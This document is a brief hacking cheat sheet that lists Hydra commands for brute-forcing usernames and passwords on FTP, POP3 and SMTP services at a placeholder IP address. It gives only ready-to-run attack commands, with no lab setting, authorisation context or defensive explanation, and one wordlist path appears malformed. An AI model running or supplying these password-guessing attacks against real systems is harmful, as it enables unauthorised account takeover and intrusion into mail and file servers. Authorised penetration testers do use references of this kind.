---
title: Hydra
category: Hacking
---


|Command                                                                   |Description           |
|--------------------------------------------------------------------------|----------------------|
|hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V |Hydra FTP brute force |
|hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V|Hydra POP3 brute force|
|hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V               |Hydra SMTP brute force|
